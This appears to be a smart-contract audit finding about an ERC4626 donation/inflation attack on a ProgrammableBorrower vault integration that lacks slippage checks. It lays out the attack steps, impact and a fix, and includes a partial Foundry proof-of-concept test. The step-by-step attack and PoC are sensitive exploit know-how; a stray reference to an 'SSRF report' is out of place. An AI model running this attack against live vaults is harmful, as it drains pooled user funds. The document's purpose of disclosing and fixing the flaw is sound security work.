### Title
Unprotected ERC4626 deposits let a vault user inflate the share price and socialize the loss onto tranche holders - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` deposits pool assets into a configured ERC4626 `vault` with no minimum-shares / slippage check, and prices all vault PnL through `vault.convertToAssets`. An unprivileged attacker who is a user of that vault can execute a first-depositor/donation manipulation against the ERC4626 exchange rate, causing the pool's deposit to mint fewer shares than the assets sent. The difference is booked as `vaultLoss` and socialized into tranche holders at `stopEpoch`, while the attacker redeems their inflated vault shares for a profit.

### Finding Description
The SSRF report maps to "trusting an externally fetched value without validation"; in this codebase the external fetch is the ERC4626 exchange rate read at `ProgrammableBorrower._currentVaultAssets()` (line 546-549), which feeds `_vaultNetInterest` (line 337-347) and `totalInterestDueNow` (line 330-334), the single interest value `IdleCDOEpochVariant` reads to price the epoch.

Deposits into the vault occur in three places, all via raw `vault.deposit` with no `minShares` bound:

- `onStartEpoch` line 216: `_depositToVault(underlyingToken.balanceOf(address(this)), 0)` — the entire epoch principal is parked.
- `_depositToVault` line 380: `uint256 shares = vault.deposit(_assetAmount, address(this));` — shares received are never checked.
- `_repay` lines 499/527: repayments are re-deployed during an active epoch.

Attack sequence (buffer phase → running epoch, any mode):

1. Owner configures `ProgrammableBorrower` with a fresh or near-empty ERC4626 vault (only `asset()` is validated at initialize line 119 / `setVault` line 160).
2. Attacker (any EOA, no role needed — they are merely a user of the external vault) deposits 1 wei to mint 1 share, then donates `D` underlying directly to the vault, inflating the per-share price to ~`1 + D`.
3. `startEpoch` runs: `onStartEpoch` deposits the pool's `P` assets. The pool receives `P * totalSupply / totalAssets` shares — worth materially less than `P` when `D` is large relative to `P`.
4. The missing value is not counted in `epochDepositedToVault` (deposits only extend the baseline when `_principalAssets != 0`, and `onStartEpoch` passes `0`), so `_vaultNetInterest` reports the shortfall as `loss` at the next `stopEpoch`.
5. `totalInterestDueNow` is reduced / the loss is realized into tranche prices via `_updateAccounting` in `IdleCDOEpochVariant._stopEpoch` (line 393-436), i.e., socialized BB-first across LPs.
6. Attacker redeems vault shares, recovering donation plus the value skimmed from the pool's deposit.

No existing guard prevents this: `nonReentrant` doesn't help (no reentrancy needed), `_checkOnlyIdleCDO` only gates who calls the hook, KYC/`isWalletAllowed` is irrelevant because the attacker never touches the pool directly, and `setVault`'s `vault.balanceOf != 0` check only covers switching, not the initial vault choice or continued deposits into a manipulated rate.

### Impact Explanation
Direct loss of pool principal, capped near ~50% of the deposited amount under the classic inflation bound, but unbounded in the degenerate case where the pool's deposit mints 0 shares (pool donates 100% of `P` to the vault when `totalAssets` rounding rounds the minted shares to zero or near-zero). The loss is booked as `vaultLoss` and socialized to tranche holders, junior (BB) tranche first. Attacker profit equals pool loss minus gas; attacker needs no role, only the ability to hold vault shares and transfer underlying.

### Likelihood Explanation
Requires an ERC4626 vault with a manipulable exchange rate — easiest on first deposit (empty vault) but also viable whenever `totalSupply` is small relative to the pool deposit. Owner/manager are honest but can legitimately configure a newly created vault, which is precisely the vulnerable configuration. The attack is atomic (front-run or same-block sandwich of `startEpoch`) and fully reproducible on a fork with any ERC4626 whose `convertToAssets` is donation-sensitive.

### Recommendation
Add slippage protection on every vault interaction: use `IERC4626.deposit` return compared against a `minSharesOut` bound (or precompute expected shares via `convertToShares`/`previewDeposit` and revert on deviation beyond a small tolerance), and similarly bound `withdraw`/`redeem`. Additionally, validate at `initialize`/`setVault` that the vault has a minimum `totalSupply`/liquidity, and use `previewDeposit`-based share accounting so a manipulated rate reverts rather than being absorbed as `vaultLoss`.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
// Uses a donation-sensitive ERC4626 (e.g., a minimal OZ-based vault without virtual offset).

contract PBVaultInflationTest is Test {
    // setUp: deploy underlying (USDC-like), DeployableERC4626 vault (empty),
    // ProgrammableBorrower proxy wired to a real/mock IdleCDOEpochVariant with
    // isProgrammableBorrower = true, one AA deposit of P = 1_000_000e6.

    function testDonationSkimOnStartEpoch() external {
        uint256 P = 1_000_000e6;

        // 1. Attacker seeds vault and inflates share price.
        deal(address(underlying), attacker, P);
        vm.startPrank(attacker);
        underlying.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);                    // 1 wei -> 1 share
        underlying.transfer(address(vault), P);        // donation: price = ~P+1 per share
        vm.stopPrank();

        // 2. Owner/manager starts the epoch; entire pool balance is parked.
        vm.prank(manager);
        cdoEpoch.startEpoch();                         // -> onStartEpoch -> _depositToVault(P, 0)

        uint256 poolShares = vault.balanceOf(address(programmableBorrower));
        uint256 poolValue  = vault.convertToAssets(poolShares);
        // Pool's vault position is worth far less than P.
        assertLt(poolValue, P * 6 / 10);               // >40% of deposit skimmed

        // 3. Epoch ends; loss is realized and socialized to tranches.
        vm.warp(block.timestamp + 30 days);
        vm.prank(manager);
        cdoEpoch.stopEpoch(0, 0);
        assertLt(cdoEpoch.virtualPrice(address(bbTranche)), ONE_TRANCHE_TOKEN);

        // 4. Attacker redeems; profit ~= P - poolValue share of donation.
        vm.prank(attacker);
        uint256 out = vault.redeem(vault.balanceOf(attacker), attacker, attacker);
        assertGt(out, P);                              // attacker nets the skimmed portion
    }
}
```